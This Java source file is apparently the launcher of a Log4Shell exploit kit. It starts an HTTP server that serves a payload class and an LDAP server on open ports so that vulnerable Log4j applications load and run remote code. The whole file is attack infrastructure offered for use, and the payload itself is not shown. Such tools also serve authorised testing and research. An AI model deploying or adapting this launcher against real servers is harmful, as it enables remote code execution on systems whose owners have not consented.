package fr.thesmyler.log4shell;

import fr.thesmyler.log4shell.payloads.ExploitTemplate;
import net.minecrell.terminalconsole.SimpleTerminalConsole;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.concurrent.atomic.AtomicBoolean;

public class ExploitLauncher extends SimpleTerminalConsole {

    private final AtomicBoolean running = new AtomicBoolean(true);

    public static final Logger LOGGER = LogManager.getLogger("EXPLOIT");
    private HttpJndiServer httpServer;
    private LdapJndiServer ldapServer;

    public static void main(String... args) {
        new ExploitLauncher().start();
    }

    public void start() {
        try {
            this.httpServer = HttpJndiServer.instance();
            this.httpServer.addConnector("0.0.0.0", 1338);
            this.httpServer.setDefaultPayload(ExploitTemplate.class);
            this.ldapServer = new LdapJndiServer("0.0.0.0", 1339, this.httpServer.getUrl());
            this.httpServer.start();
            this.ldapServer.start();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        LOGGER.info("Starting console");
        super.start();
    }

    @Override
    protected boolean isRunning() {
        return this.running.get();
    }

    @Override
    protected void runCommand(String command) {
        if ("quit".equals(command)) this.running.set(false);
    }

    @Override
    protected void shutdown() {
        this.running.set(false);
    }

}
